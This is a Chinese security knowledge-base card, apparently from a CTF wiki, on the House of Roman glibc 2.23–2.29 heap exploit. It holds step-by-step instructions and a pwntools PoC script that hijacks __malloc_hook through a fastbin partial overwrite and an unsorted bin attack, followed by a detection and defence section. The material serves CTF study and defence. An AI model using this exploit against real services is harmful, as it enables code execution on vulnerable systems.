---
id: binary-pwn-heap-house-of-roman-fastbin-unsortedbin-malloc-hook-bruteforce
title: House of Roman：无 libc 泄露下 fastbin 局部覆写 + unsorted bin attack 把 __malloc_hook 改写为 one_gadget（12-bit 爆破）
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-roman-fastbin-partial-overwrite-unsortedbin-attack-malloc-hook-bruteforce
affected_versions: glibc 2.23-2.29
tags:
- pwn
- heap
- glibc-2.23
- glibc-2.29
- fastbin-attack
- unsorted-bin-attack
- malloc-hook
- partial-overwrite
- bruteforce
- no-libc-leak
- one-gadget
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V296
  verified_at: '2026-11-08T08:27:02+08:00'
  notes: 已对照原文与21张图核对：四块 0x70/0x90/0x90/0x70 布局（图01/15）、free 2 号进 unsorted fd/bk=main_arena+0x58=0x7ffff77c3b78（图02/04）、切出 0x60 块残留 libc 指针（图03）、free(3)/free(0) 后 fastbin 0x70 chunk0→chunk3（图05/17）、改 chunk0 fd 末字节 0x90→0x00 后链到 chunk4（图07/18）、改 chunk4 为 0x7ffff7bc3aed=malloc_hook-0x23（图06/19）、unsorted bin attack 把 0x7ffff77c3b78 写入 malloc_hook（图08-10/20）、局部覆写为 system 0x7ffff7845380（图21）均与卡片一致；保护为 PIE/NX/Partial RELRO（图11），edit read(size+1) off-by-one（图13）、free 不置空 UAF（图14）、add 任意大小 idx<=19（图16）与触发条件一致。修正：卡片示例 main_arena 地址笔误 0x7ffff7bc3b78→0x7ffff77c3b78（与图02/10一致）。未验证点：原文未实际完成 1/4096 爆破（本地关 ASLR 写死低位），卡片已注明；未本机复跑；affected_versions 按原文『2.23 到 2.29 可用』保留；frontmatter 无 sources/source_url。dup-scan 与 14582 无 show fastbin 伪 unsorted+stdout 泄 libc 卡为 related，机制不同（本卡 unsorted bin attack 写 hook+12-bit 爆破，14582 用 stdout 泄 libc 再 fastbin dup），均保留。
url: /docs/binary/pwn/heap/binary-pwn-heap-house-of-roman-fastbin-unsortedbin-malloc-hook-bruteforce/
draft: false
kb_aliases:
- House of Roman
- house_of_roman
- 罗马之家
- 局部写 malloc_hook
- 无泄露打 malloc_hook
- 12-bit 爆破堆利用
- fastbin 局部覆写加 unsortedbin attack
---

## 一句话结论

在 glibc 2.23–2.29 的无 show 堆题里，只要有 UAF（或 off-by-one 级别的局部写）并能申请任意大小的堆块，House of Roman 可以在完全不知道 libc 基址和堆地址的情况下接管 `__malloc_hook`：先改 fastbin 已释放块 fd 的最低字节，把链引回从 unsorted bin 切出的、残留 `main_arena+0x58` 指针的块；再把该块 fd 的低 2 字节改成 `__malloc_hook-0x23` 附近，申请出 hook 旁边的伪 fastbin 块；然后用 UAF 把 unsorted bin 块的 bk 改成 `__malloc_hook-0x10`，借 unsorted bin attack 把 `main_arena+0x58` 写进 `__malloc_hook`；最后只覆写 hook 的低 2–3 字节改成 one_gadget/system，并以约 12 bit（1/4096）的爆破换取成功。

## 原理

- **为什么可以只改低字节**：同一进程内 heap 映射和 libc 映射的高位在多次分配/释放之间保持不变，fastbin 的 `fd` 又恰好指向同页/邻近页的 chunk，所以只覆写 fd 的最低 1 个字节就能让 fastbin 链跳到一个“同页低位地址”的块。原文利用 `free(3); free(0)` 后 0x70 fastbin 为 `chunk0 -> chunk3`，把 chunk0 的 fd 末字节改成 `0x00` 后，链变成 `chunk0 -> chunk4`，而 chunk4 正是此前从 unsorted bin 中切出来的 0x60 块。
- **unsorted 切出块的残留指针**：0x80 请求对应的 0x90 块被 free 后进入 unsorted bin，其 `fd`/`bk` 都指向 `main_arena+0x58`（本例 0x7ffff77c3b78）。再从该块切出一个 0x60 块时，新块的数据区保留了这组 main_arena 指针，因此即使程序没有 show，也能在内存里拿到一个 libc 指针。
- **由 main_arena 推算 malloc_hook**：`main_arena` 与 `__malloc_hook` 在 libc 内的相对偏移固定，二者高字节相同，只有低几位不同；原文观察到两者低 3 位十六进制数字固定，因此只要能得到 main_arena 指针的低位布局，就可以把 fd 指向 `__malloc_hook-0x23`（偏移选择见下一条）。
- **`__malloc_hook-0x23` 为什么是合法 fastbin 目标**：fastbin 分配时会校验目标伪块的 size 字段。`__malloc_hook-0x23` 作为 chunk 头时，其 size 字段落在 libc 数据中恰好可被解释为 0x7f 的字节上，于是通过检查，malloc 返回的用户数据区从 `__malloc_hook-0x13` 开始。
- **unsorted bin attack 的写入**：释放一个超过 fastbin 上限的块后，用 UAF 把它的 `bk` 改为 `__malloc_hook-0x10`；下一次申请同尺寸块时，glibc 从 unsorted bin 摘下该块并执行 `bck->fd = unsorted_chunks(av)`，相当于把 `main_arena+0x58` 写进 `__malloc_hook`。这一步把“已知的 libc 指针”直接写进 hook，绕过了没有泄露的限制。
- **为什么还要爆破**：`main_arena+0x58` 与 one_gadget/system 都在 libc 内，高字节一致，理论上只改低字节即可；但 64 位 ASLR 会随机化 libc 基址，页对齐只保证低 12 位固定，剩余需要猜的随机位约 12 bit，因此整体成功率约 1/4096。原文在本地关闭 ASLR 后直接用 `p16(0x3aed)` 和 `p16(0x5380)+p8(0x84)` 写死，真实环境要反复连接重试。
- **版本边界**：原文指出该手法在 2.23 到 2.29 之间可用，原因是 2.29 之后 unsorted bin attack 写指针的路径被加上检查而失效；同时 glibc 2.34 起 malloc/free hooks 被移除，即使 unsorted bin attack 可用也失去目标。

## 触发条件

- 目标使用 glibc 2.23–2.29（无 tcache 干扰或 tcache 行为不影响 fastbin/unsorted bin 阶段），且保留 `__malloc_hook`。
- 存在 UAF：free 后索引不置空，edit 仍可写已释放块；或存在 off-by-one/固定长度写，能改到已释放 fastbin 块的 fd 与 unsorted bin 块的 bk。
- 能申请任意大小堆块：既需要 fastbin 尺寸（0x60/0x70 请求），也需要超过 fastbin 上限的尺寸（0x80/0x90 请求）来构造 unsorted bin 块。
- 程序没有 show 或无法泄露 libc（有泄露时可直接用 fastbin dup 打 hook，不需要本链）。
- 目标 libc 版本已知，能确定 `main_arena+0x58`、`__malloc_hook` 与 one_gadget/system 的相对偏移，并接受 1/4096 量级的爆破重试。
- 原文题目：add 最多 19 个任意大小块；edit 用 `read(ptr, size+1)` 造成 off-by-one；delete 直接 free 不置空造成 UAF；无 show。

## 利用步骤

1. 布局四个块：`add(0x60,0)`, `add(0x80,1)`, `add(0x80,2)`, `add(0x60,3)`。
2. `free(2)` 让 0x90 块进入 unsorted bin；此时其 fd/bk 为 `main_arena+0x58`。
3. `add(0x60,4)` 从该 unsorted 块切出 0x60 块，块 4 内残留 main_arena 指针；由此确定 `__malloc_hook` 的低位布局。
4. `free(3); free(0)` 形成 0x70 fastbin，链为 `chunk0 -> chunk3`（chunk 3 是 0x60 请求对应的 0x70 块）。
5. `edit(0, b'\x00')`：通过 UAF/off-by-one 把 chunk0 的 fd 最低字节从 0x90 改为 0x00，使其指向同页低地址的块 4（从 unsorted bin 切出的块）。
6. `edit(4, p16(0x3aed))`：把块 4 的 fd 低 2 字节改成 `__malloc_hook-0x23` 的地址（本地关 ASLR 时写死；真实环境需爆破该低位）。
7. 连续 `add(0x60,5)`, `add(0x60,6)` 消耗 fastbin 链上的块，再 `add(0x60,7)` 即可拿到位于 `__malloc_hook-0x23` 的伪块，其用户数据区从 `__malloc_hook-0x13` 开始。
8. 构造 unsorted bin attack：`add(0x80,8)`, `add(0x30,9)`（0x30 块防止被 free 的块与 top 合并），`free(8)`；`edit(8, p64(0)+p8(0))` 把 fd 写 0、bk 末字节写 0，使 `bk = __malloc_hook-0x10`。
9. `add(0x80,10)` 触发 unsorted bin 取出逻辑：`__malloc_hook` 被写成 `main_arena+0x58`。
10. `edit(7, b'a'*0x13 + p16(0x5380) + p8(0x84))`：从 `__malloc_hook-0x13` 起写 0x13 字节填充，再用 2+1 字节把 `__malloc_hook` 的低位改成 system/one_gadget（示例地址 0x7ffff7845380）。
11. `add(0x20,10)` 触发 malloc，执行 `__malloc_hook` 指向的 one_gadget/system；若未命中（爆破失败）则重新连接重试，成功率约 1/4096。

## PoC

原文 exp 的最小骨架（2.23，索引与偏移按原题；未在本机复跑；爆破部分原文偷懒未做，仅演示关 ASLR 下的命中）：

```python
from pwn import *
io = process('./pwn')
libc = ELF('libc-2.23.so')

def add(size, idx): ...
def free(idx): ...
def edit(idx, data): ...   # read(ptr, size+1)，注意用 send 避免破坏部分覆写

add(0x60, 0); add(0x80, 1); add(0x80, 2); add(0x60, 3)
free(2)                    # 0x90 块进 unsorted bin
add(0x60, 4)               # 切出带 main_arena 指针的块
free(3); free(0)           # 0x70 fastbin: chunk0 -> chunk3
edit(0, b'\x00')           # fd 低字节 0x90 -> 0x00，指向块4
edit(4, p16(0x3aed))       # fd -> __malloc_hook-0x23（本地关 ASLR；真实环境爆破）
add(0x60, 5); add(0x60, 6); add(0x60, 7)   # 7 号落在 __malloc_hook-0x23

add(0x80, 8); add(0x30, 9)
free(8)
edit(8, p64(0) + p8(0))    # bk = __malloc_hook-0x10
add(0x80, 10)              # unsorted bin attack: __malloc_hook = main_arena+0x58

edit(7, b'a' * 0x13 + p16(0x5380) + p8(0x84))  # 低 2~3 字节改成 system/one_gadget
add(0x20, 10)              # 触发 malloc -> hook
io.interactive()
```

调试时可对照：`bins` 中 0x70 fastbin 的 fd 应指向堆内 0x...00 结尾的块；`x/2gx &__malloc_hook` 应依次看到 main_arena 指针和改写后的 one_gadget/system 地址。

## 变体与关联

- 有 show/libc 泄露时：直接 `free -> show` 泄露 main_arena，再走 fastbin dup/tcache poisoning 打 `__malloc_hook`/`__free_hook`，不需要 unsorted bin attack 与爆破，见 [[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]。
- 无 show 但有 stdout 利用条件时：可先用 [[binary-pwn-heap-stdout-partial-overwrite-libc-leak]] 造泄露，再回到常规 hook 打法，省去爆破。
- unsorted bin attack 本身是通用原语：可把 `main_arena+0x58` 写到任意可写地址（如 `global_max_fast`），参见 [[binary-pwn-heap-unsorted-bin-global-max-fast-bss-fake-fastbin-free-hook]] 与 [[binary-pwn-heap-house-of-orange-unsortedbin-io-list-all-fsop-system]]（后者改 `_IO_list_all`）。
- glibc 2.29+：unsorted bin attack 的写指针路径被修，House of Roman 失效；2.31+ 可改走 largebin attack，2.34+ 因 hooks 移除需改用 FSOP/setcontext/栈 ROP。
- 关系澄清：House of Roman 并不是新的 house 结构，本质是 fastbin attack 与 unsorted bin attack 的组合，原文亦如此定性。

## 检测与防御

- **修复根因**：free/delete 后立即把索引指针置 NULL 并记录已释放状态；edit 必须校验索引处于已分配状态；长度校验要严格，不要出现 `read(ptr, size+1)` 这类 off-by-one。
- **分配器加固**：升级 glibc 到 2.30+（unsorted bin attack 被修）或 2.34+（malloc/free hooks 移除）；开启 tcache key、safe-linking；服务进程使用独立分配器或堆隔离。
- **检测**：fastbin 的 fd 指向 libc 数据段（尤其 `__malloc_hook` 附近）；`malloc` 返回的用户地址落在 libc 映射；unsorted bin 块的 bk 被改成 libc 数据段；`__malloc_hook` 中出现 main_arena/one_gadget 值；进程异常 `execve("/bin/sh")`。
- **响应**：出现上述堆元数据异常即终止进程、保留 core，检查是否已写入 hook/ROP 链，并升级 glibc/修补 UAF。
